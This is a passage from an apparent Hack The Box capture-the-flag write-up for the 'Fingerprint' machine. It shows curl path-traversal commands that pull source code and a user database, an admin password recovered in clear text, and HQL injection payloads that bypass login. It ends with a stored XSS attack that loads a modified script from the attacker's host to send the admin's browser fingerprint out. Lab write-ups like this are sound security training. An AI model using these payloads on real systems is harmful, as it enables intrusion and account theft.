class="string">&#x27;login.html&#x27;</span>)%</span><br></pre></td></tr></table></figure>

<p>Following the breadcrumbs in <code>app.py</code> we can retrieve other important files:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .auth <span class="keyword">import</span> check</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-<span class="keyword">as</span>-<span class="keyword">is</span> <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../home/flask/app/auth.py&quot;</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">user, password</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .util <span class="keyword">import</span> build_safe_sql_where</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;users.db&#x27;</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cond = build_safe_sql_where(&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line"></span><br><span class="line">query = <span class="string">&quot;select * from users &quot;</span> + cond</span><br><span class="line"></span><br><span class="line">cursor.execute(query)</span><br><span class="line"></span><br><span class="line">rows = cursor.fetchall()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> rows:</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>%</span><br></pre></td></tr></table></figure>

<h3 id="users-db-database"><a href="#users-db-database" class="headerlink" title="users.db database"></a>users.db database</h3><p>Upon reading the source code of <code>[app.py](http://app.py)</code> we know where to get the <code>users.db</code> database, let’s get it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-as-is <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../home/flask/app/users.db&quot;</span> -o users.db</span><br></pre></td></tr></table></figure>

<p>After opening it we can find the <code>admin</code> login and its clear text password:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlite3 users.db</span><br><span class="line">SQLite version 3.38.2 2022-03-26 13:51:10</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">users</span><br><span class="line">sqlite&gt; SELECT * FROM users;</span><br><span class="line">0|admin|u_will_never_guess_this_password</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure>

<p>Ok, we got the <code>admin</code> credentials and can now connect to the website:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/163688997-7d268b7c-07a4-450d-bc5a-abfc9de98fc5.png" alt="https://user-images.githubusercontent.com/9076747/163688997-7d268b7c-07a4-450d-bc5a-abfc9de98fc5.png"></p>
<p>The application only function seems to be displaying the <code>auth.log</code> file from this admin interface. When opening the file we can notice it’s the authentication log from the other application running on port 8080: </p>
<p><img src="https://user-images.githubusercontent.com/9076747/163689139-f8eccb2f-2169-457e-a6d8-e666a385fc68.png" alt="https://user-images.githubusercontent.com/9076747/163689139-f8eccb2f-2169-457e-a6d8-e666a385fc68.png"></p>
<h3 id="XSS-on-auth-log"><a href="#XSS-on-auth-log" class="headerlink" title="XSS on auth.log"></a>XSS on auth.log</h3><p>The first thing that comes to mind is <a target="_blank" rel="noopener" href="https://www.notion.so/u_will_never_guess_this_password-ccf721841b4f4596bc477b33ec752f97">log poisoning</a> in order to achieve Remote Code Execution (RCE) from the RFI we found earlier. Unfortunately this won’t be possible since the app is running in Python and not PHP. </p>
<p>We can do self-XSS by inputting JavaScript in the username or password field but that won’t be helpful. Let’s move on.</p>
<p><img src="https://user-images.githubusercontent.com/9076747/163689525-da0d789c-4a6e-4e43-80a2-55f3d5cb8cd2.png" alt="https://user-images.githubusercontent.com/9076747/163689525-da0d789c-4a6e-4e43-80a2-55f3d5cb8cd2.png"></p>
<h3 id="HQL-Injection"><a href="#HQL-Injection" class="headerlink" title="HQL Injection"></a>HQL Injection</h3><p>I want to take the time to focus on the authentication page of the second app running on port 8080. </p>
<p>As any competent pen tester the first thing I tried was SQL injection on the password field but with no luck. Then I tried setting my username to <code>hg8&#39;</code> and surprisingly it worked and a <code>QueryException</code> got raised:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/163690088-f1798f94-a65b-4cae-87fe-c2225bd9b719.png" alt="https://user-images.githubusercontent.com/9076747/163690088-f1798f94-a65b-4cae-87fe-c2225bd9b719.png"></p>
<p>It looks like the password field is filtered for SQL injection but not the username field.</p>
<p>I was unfamiliar with <code>Hibernate</code>, turns out it’s a query language (HQL): </p>
<blockquote>
<p>Hibernate uses a powerful query language (HQL) that is similar in appearance to SQL. Compared with SQL, however, HQL is fully object-oriented and understands notions like inheritance, polymorphism and association.<br><a target="_blank" rel="noopener" href="https://docs.jboss.org/hibernate/core/3.3/reference/en/html/queryhql.html">https://docs.jboss.org/hibernate/core/3.3/reference/en/html/queryhql.html</a></p>
</blockquote>
<p>When trying the most common injection <code>uid=x&#39; OR 1 = 1 and &#39;&#39;=&#39;&amp;auth_primary=x&amp;auth_secondary=15ada043824662a14c90f70a82f31a25</code> we get a new error message:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.persistence.NonUniqueResultException: query did <span class="keyword">not</span> <span class="keyword">return</span> a <span class="keyword">unique</span> <span class="keyword">result</span>: <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>Seems like we have 2 users in the database. I manually tried <code>admin</code> and <code>john</code> but neither worked.</p>
<p>HQL does not support UNION queries nor comments, which make it difficult to exfiltrate table information.<br>Then, one technique we can use is <code>substring()</code> to iterate on each character of the username.</p>
<p>We can imagine the query run by the app being the following format:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> u <span class="keyword">FROM</span> Users u <span class="keyword">WHERE</span> u.uid <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> authprimary <span class="operator">=</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">AND</span> authsecondary <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure>

<p>We can try the following injection <code>x&#39; OR SUBSTRING(uid,1,1)=&#39;a&#39; and &#39;&#39;=&#39;</code> which will end up in the following query:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> u <span class="keyword">FROM</span> Users u <span class="keyword">WHERE</span> u.uid <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">OR</span> <span class="built_in">SUBSTRING</span>(uid,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;&#x27;</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">AND</span> auth_primary <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">AND</span> auth_secondary <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure>

<p>We get a new error that seems to mean the <code>uid</code> field doesn’t exist.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.persistence.PersistenceException: org.hibernate.exception.SQLGrammarException: could <span class="keyword">not</span> extract ResultSet</span><br></pre></td></tr></table></figure>

<p>Let’s try with <code>username</code> instead:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span>x<span class="string">&#x27; OR SUBSTRING(username,1,1)=&#x27;</span>a<span class="string">&#x27; and &#x27;&#x27;=&#x27;</span><span class="operator">&amp;</span>auth_primary<span class="operator">=</span>x<span class="operator">&amp;</span>auth_secondary<span class="operator">=</span><span class="number">15</span>ada043824662a14c90f70a82f31a2525</span><br></pre></td></tr></table></figure>

<p>Bingo! It works and we get a new error this time about <code>auth_secondary</code> meaning we probably successfully bypassed the username/password part of the authentication:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/163710365-7515ee7f-f3fd-4dd8-afc3-4d8d4496196d.png" alt="https://user-images.githubusercontent.com/9076747/163710365-7515ee7f-f3fd-4dd8-afc3-4d8d4496196d.png"></p>
<p><em>Note: We could have guessed the username was <code>admin</code> and the following payload would have worked as well:</em></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span>x<span class="string">&#x27; OR username=&#x27;</span>admin<span class="string">&#x27; and &#x27;&#x27;=&#x27;</span><span class="operator">&amp;</span>auth_primary<span class="operator">=</span>x<span class="operator">&amp;</span>auth_secondary<span class="operator">=</span><span class="number">15</span>ada043824662a14c90f70a82f31a25</span><br></pre></td></tr></table></figure>

<p><em>The <code>substring</code> method could have been used to enumerate the username of the second user with a simple script. So far it doesn’t seem necessary.</em></p>
<p>Let’s now focus on the unusual <code>auth_secondary</code> parameter sent when trying to log in:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/163689606-e3c205dd-be3d-479e-92b8-658f5b71d095.png" alt="https://user-images.githubusercontent.com/9076747/163689606-e3c205dd-be3d-479e-92b8-658f5b71d095.png"></p>
<p>The parameter is the same on every request and looks like an MD5 format. </p>
<p>Checking the page source code we can see the JavaScript file generating the <code>auth_secondary</code> string at <a target="_blank" rel="noopener" href="http://fingerprint.htb:8080/resources/js/login.js"><code>http://fingerprint.htb:8080/resources/js/login.js</code></a> </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFingerPrintID</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> fingerprint = navigator.appCodeName + navigator.appVersion + (navigator.cookieEnabled ? <span class="string">&quot;yes&quot;</span> : <span class="string">&quot;no&quot;</span>) + navigator.language + navigator.platform + navigator.productSub + navigator.userAgent + navigator.vendor + screen.availWidth + <span class="string">&quot;&quot;</span> + screen.availHeight + <span class="string">&quot;&quot;</span> + screen.width + <span class="string">&quot;&quot;</span> + screen.height + <span class="string">&quot;&quot;</span> + screen.orientation.type + <span class="string">&quot;&quot;</span> + screen.pixelDepth + <span class="string">&quot;&quot;</span> + screen.colorDepth + <span class="built_in">Intl</span>.DateTimeFormat().resolvedOptions().timeZone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> plugin <span class="keyword">of</span> navigator.plugins) &#123;</span><br><span class="line">        fingerprint += plugin.name + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> mime <span class="keyword">of</span> navigator.mimeTypes) &#123;</span><br><span class="line">        fingerprint += mime.type + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> MD5(fingerprint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So this is where the name of the box comes from. This function is gathering a lot of information from the client and creating an MD5 fingerprint from concatenating all this data. </p>
<p>We can guess that only the fingerprint of the two users in the database are allowed to connect.</p>
<p>The MD5 hash function comes from a <a target="_blank" rel="noopener" href="https://stackoverflow.com/a/69122129">common JavaScript implementation</a>:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> md5 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> MD5 = <span class="function"><span class="keyword">function</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> M(V(Y(X(d), <span class="number">8</span> * d.length)))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">M</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _, m = <span class="string">&#x27;0123456789abcdef&#x27;</span>, f = <span class="string">&#x27;&#x27;</span>, r = <span class="number">0</span>; r &lt; d.length; r++) &#123;</span><br><span class="line">            _ = d.charCodeAt(r)</span><br><span class="line">            f += m.charAt(_ &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>) + m.charAt(<span class="number">15</span> &amp; _)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">X</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="built_in">Array</span>(d.length &gt;&gt; <span class="number">2</span>), m = <span class="number">0</span>; m &lt; _.length; m++) &#123;</span><br><span class="line">            _[m] = <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (m = <span class="number">0</span>; m &lt; <span class="number">8</span> * d.length; m += <span class="number">8</span>) &#123;</span><br><span class="line">            _[m &gt;&gt; <span class="number">5</span>] |= (<span class="number">255</span> &amp; d.charCodeAt(m / <span class="number">8</span>)) &lt;&lt; m % <span class="number">32</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">V</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="string">&#x27;&#x27;</span>, m = <span class="number">0</span>; m &lt; <span class="number">32</span> * d.length; m += <span class="number">8</span>) _ += <span class="built_in">String</span>.fromCharCode(d[m &gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; m % <span class="number">32</span> &amp; <span class="number">255</span>)</span><br><span class="line">        <span class="keyword">return</span> _</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Y</span> (<span class="params">d, _</span>) </span>&#123;</span><br><span class="line">        d[_ &gt;&gt; <span class="number">5</span>] |= <span class="number">128</span> &lt;&lt; _ % <span class="number">32</span></span><br><span class="line">        d[<span class="number">14</span> + (_ + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>)] = _</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">1732584193</span>, f = -<span class="number">271733879</span>, r = -<span class="number">1732584194</span>, i = <span class="number">271733878</span>, n = <span class="number">0</span>; n &lt; d.length; n += <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> h = m</span><br><span class="line">            <span class="keyword">var</span> t = f</span><br><span class="line">            <span class="keyword">var</span> g = r</span><br><span class="line">            <span class="keyword">var</span> e = i</span><br><span class="line">            f = md5ii(f = md5ii(f = md5ii(f = md5ii(f = md5hh(f = md5hh(f = md5hh(f = md5hh(f = md5gg(f = md5gg(f = md5gg(f = md5gg(f = md5ff(f = md5ff(f = md5ff(f = md5ff(f, r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">0</span>], <span class="number">7</span>, -<span class="number">680876936</span>), f, r, d[n + <span class="number">1</span>], <span class="number">12</span>, -<span class="number">389564586</span>), m, f, d[n + <span class="number">2</span>], <span class="number">17</span>, <span class="number">606105819</span>), i, m, d[n + <span class="number">3</span>], <span class="number">22</span>, -<span class="number">1044525330</span>), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">4</span>], <span class="number">7</span>, -<span class="number">176418897</span>), f, r, d[n + <span class="number">5</span>], <span class="number">12</span>, <span class="number">1200080426</span>), m, f, d[n + <span class="number">6</span>], <span class="number">17</span>, -<span class="number">1473231341</span>), i, m, d[n + <span class="number">7</span>], <span class="number">22</span>, -<span class="number">45705983</span>), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">8</span>], <span class="number">7</span>, <span class="number">1770035416</span>), f, r, d[n + <span class="number">9</span>], <span class="number">12</span>, -<span class="number">1958414417</span>), m, f, d[n + <span class="number">10</span>], <span class="number">17</span>, -<span class="number">42063</span>), i, m, d[n + <span class="number">11</span>], <span class="number">22</span>, -<span class="number">1990404162</span>), r = md5ff(r, i = md5ff(i, m = md5ff(m, f, r, i, d[n + <span class="number">12</span>], <span class="number">7</span>, <span class="number">1804603682</span>), f, r, d[n + <span class="number">13</span>], <span class="number">12</span>, -<span class="number">40341101</span>), m, f, d[n + <span class="number">14</span>], <span class="number">17</span>, -<span class="number">1502002290</span>), i, m, d[n + <span class="number">15</span>], <span class="number">22</span>, <span class="number">1236535329</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">1</span>], <span class="number">5</span>, -<span class="number">165796510</span>), f, r, d[n + <span class="number">6</span>], <span class="number">9</span>, -<span class="number">1069501632</span>), m, f, d[n + <span class="number">11</span>], <span class="number">14</span>, <span class="number">643717713</span>), i, m, d[n + <span class="number">0</span>], <span class="number">20</span>, -<span class="number">373897302</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">5</span>], <span class="number">5</span>, -<span class="number">701558691</span>), f, r, d[n + <span class="number">10</span>], <span class="number">9</span>, <span class="number">38016083</span>), m, f, d[n + <span class="number">15</span>], <span class="number">14</span>, -<span class="number">660478335</span>), i, m, d[n + <span class="number">4</span>], <span class="number">20</span>, -<span class="number">405537848</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">9</span>], <span class="number">5</span>, <span class="number">568446438</span>), f, r, d[n + <span class="number">14</span>], <span class="number">9</span>, -<span class="number">1019803690</span>), m, f, d[n + <span class="number">3</span>], <span class="number">14</span>, -<span class="number">187363961</span>), i, m, d[n + <span class="number">8</span>], <span class="number">20</span>, <span class="number">1163531501</span>), r = md5gg(r, i = md5gg(i, m = md5gg(m, f, r, i, d[n + <span class="number">13</span>], <span class="number">5</span>, -<span class="number">1444681467</span>), f, r, d[n + <span class="number">2</span>], <span class="number">9</span>, -<span class="number">51403784</span>), m, f, d[n + <span class="number">7</span>], <span class="number">14</span>, <span class="number">1735328473</span>), i, m, d[n + <span class="number">12</span>], <span class="number">20</span>, -<span class="number">1926607734</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">5</span>], <span class="number">4</span>, -<span class="number">378558</span>), f, r, d[n + <span class="number">8</span>], <span class="number">11</span>, -<span class="number">2022574463</span>), m, f, d[n + <span class="number">11</span>], <span class="number">16</span>, <span class="number">1839030562</span>), i, m, d[n + <span class="number">14</span>], <span class="number">23</span>, -<span class="number">35309556</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">1</span>], <span class="number">4</span>, -<span class="number">1530992060</span>), f, r, d[n + <span class="number">4</span>], <span class="number">11</span>, <span class="number">1272893353</span>), m, f, d[n + <span class="number">7</span>], <span class="number">16</span>, -<span class="number">155497632</span>), i, m, d[n + <span class="number">10</span>], <span class="number">23</span>, -<span class="number">1094730640</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">13</span>], <span class="number">4</span>, <span class="number">681279174</span>), f, r, d[n + <span class="number">0</span>], <span class="number">11</span>, -<span class="number">358537222</span>), m, f, d[n + <span class="number">3</span>], <span class="number">16</span>, -<span class="number">722521979</span>), i, m, d[n + <span class="number">6</span>], <span class="number">23</span>, <span class="number">76029189</span>), r = md5hh(r, i = md5hh(i, m = md5hh(m, f, r, i, d[n + <span class="number">9</span>], <span class="number">4</span>, -<span class="number">640364487</span>), f, r, d[n + <span class="number">12</span>], <span class="number">11</span>, -<span class="number">421815835</span>), m, f, d[n + <span class="number">15</span>], <span class="number">16</span>, <span class="number">530742520</span>), i, m, d[n + <span class="number">2</span>], <span class="number">23</span>, -<span class="number">995338651</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">0</span>], <span class="number">6</span>, -<span class="number">198630844</span>), f, r, d[n + <span class="number">7</span>], <span class="number">10</span>, <span class="number">1126891415</span>), m, f, d[n + <span class="number">14</span>], <span class="number">15</span>, -<span class="number">1416354905</span>), i, m, d[n + <span class="number">5</span>], <span class="number">21</span>, -<span class="number">57434055</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">12</span>], <span class="number">6</span>, <span class="number">1700485571</span>), f, r, d[n + <span class="number">3</span>], <span class="number">10</span>, -<span class="number">1894986606</span>), m, f, d[n + <span class="number">10</span>], <span class="number">15</span>, -<span class="number">1051523</span>), i, m, d[n + <span class="number">1</span>], <span class="number">21</span>, -<span class="number">2054922799</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">8</span>], <span class="number">6</span>, <span class="number">1873313359</span>), f, r, d[n + <span class="number">15</span>], <span class="number">10</span>, -<span class="number">30611744</span>), m, f, d[n + <span class="number">6</span>], <span class="number">15</span>, -<span class="number">1560198380</span>), i, m, d[n + <span class="number">13</span>], <span class="number">21</span>, <span class="number">1309151649</span>), r = md5ii(r, i = md5ii(i, m = md5ii(m, f, r, i, d[n + <span class="number">4</span>], <span class="number">6</span>, -<span class="number">145523070</span>), f, r, d[n + <span class="number">11</span>], <span class="number">10</span>, -<span class="number">1120210379</span>), m, f, d[n + <span class="number">2</span>], <span class="number">15</span>, <span class="number">718787259</span>), i, m, d[n + <span class="number">9</span>], <span class="number">21</span>, -<span class="number">343485551</span>)</span><br><span class="line">            m = safeadd(m, h)</span><br><span class="line">            f = safeadd(f, t)</span><br><span class="line">            r = safeadd(r, g)</span><br><span class="line">            i = safeadd(i, e)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [m, f, r, i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5cmn</span> (<span class="params">d, _, m, f, r, i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> safeadd(bitrol(safeadd(safeadd(_, d), safeadd(f, i)), r), m)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5ff</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(_ &amp; m | ~_ &amp; f, d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5gg</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(_ &amp; f | m &amp; ~f, d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5hh</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(_ ^ m ^ f, d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">md5ii</span> (<span class="params">d, _, m, f, r, i, n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> md5cmn(m ^ (_ | ~f), d, _, r, i, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safeadd</span> (<span class="params">d, _</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> m = (<span class="number">65535</span> &amp; d) + (<span class="number">65535</span> &amp; _)</span><br><span class="line">        <span class="keyword">return</span> (d &gt;&gt; <span class="number">16</span>) + (_ &gt;&gt; <span class="number">16</span>) + (m &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">16</span> | <span class="number">65535</span> &amp; m</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bitrol</span> (<span class="params">d, _</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> d &lt;&lt; _ | d &gt;&gt;&gt; <span class="number">32</span> - _</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MD5Unicode</span>(<span class="params">buffer</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(buffer <span class="keyword">instanceof</span> <span class="built_in">Uint8Array</span>)) &#123;</span><br><span class="line">            buffer = <span class="keyword">new</span> TextEncoder().encode(<span class="keyword">typeof</span> buffer===<span class="string">&#x27;string&#x27;</span> ? buffer : <span class="built_in">JSON</span>.stringify(buffer));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> binary = [];</span><br><span class="line">        <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, il = bytes.byteLength; i &lt; il; i++) &#123;</span><br><span class="line">            binary.push(<span class="built_in">String</span>.fromCharCode(bytes[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> MD5(binary.join(<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> MD5Unicode;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>Given the fingerprint source code is available to us and in a JavaScript format it’s perfect for the XSS vulnerability we found earlier. By hosting the script on our attacker machine we can get the admin to trigger the XSS and exfiltrate his fingerprint for us to reuse.</p>
<p>First let’s modify the script a little so it will give us the fingerprint:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget [http://fingerprint.htb:8080/resources/js/login.js](http://fingerprint.htb:8080/resources/js/login.js)</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&#x27;location.href=&quot;http://10.10.14.80:8000/&quot;+getFingerPrintID();&#x27;</span> &gt;&gt; login.js</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br></pre></td></tr></table></figure>

<p>Then send our XSS payload to show up in the main application auth log.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://10.10.14.80:8000/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>And Bingo! We get the fingerprint of the <code>admin</code> account:</p>
